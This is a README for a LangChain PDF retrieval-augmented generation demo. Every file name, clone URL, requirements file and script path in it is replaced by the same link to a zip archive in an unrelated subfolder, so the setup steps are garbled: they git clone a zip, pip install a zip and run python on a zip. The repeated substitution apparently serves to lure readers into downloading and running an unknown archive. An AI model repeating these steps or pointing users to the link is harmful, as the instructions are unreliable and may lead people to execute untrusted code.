# LangChain PDF RAG Demo

This project demonstrates how to create a Retrieval-Augmented Generation (RAG) pipeline using LangChain, OpenAI, and FAISS. It reads a PDF, splits it into chunks, generates embeddings, and allows you to query it.

---

### 📦 Features:
- 📄 PDF loading using PyPDF
- ✂️ Smart text chunking with LangChain
- 🧠 Embeddings using OpenAI
- 🔍 FAISS vector store for fast retrieval
- 🧪 LangChain RetrievalQA chain to answer questions

---

### 🛠️ How to Use

1. **Clone the repository**
   ```bash
   git clone https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip
   cd langchain-pdf-rag
   ```

2. **Create and activate a virtual environment (recommended)**
   ```bash
   python -m venv venv
   source venv/bin/activate   # On Windows: venv\Scripts\activate
   ```

3. **Install dependencies**
   ```bash
   pip install -r https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip
   ```

4. **Add your API key on .env**
   OPENAI_API_KEY=your_openai_api_key_here

5. **Add a sample PDF**
   Place any PDF file in the root folder and name it `https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip` (or change the filename in `https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip`).

6. **Run the demo**
   ```bash
   python https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip
   ```

7. **Ask questions!**
   Once the script runs, it will load your PDF and allow you to ask questions. You’ll get answers based on the document content.

---

### 📁 File Structure

```
langchain-pdf-rag/
├── https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip              # Script to run the QA chain
├── https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip         # Contains the RetrievalQA setup function
├── https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip     # Python dependencies
├── https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip           # Your test PDF file
├── .env                 # (Not uploaded) OpenAI API key
└── https://github.com/ahmedfazil3/langchain-pdf-rag/raw/refs/heads/main/argentine/langchain_pdf_rag_v2.3.zip            # Project documentation
```

---

### 👤 Author

**Ahmed Fazil**  
Backend Developer — AI / RAG / LangChain
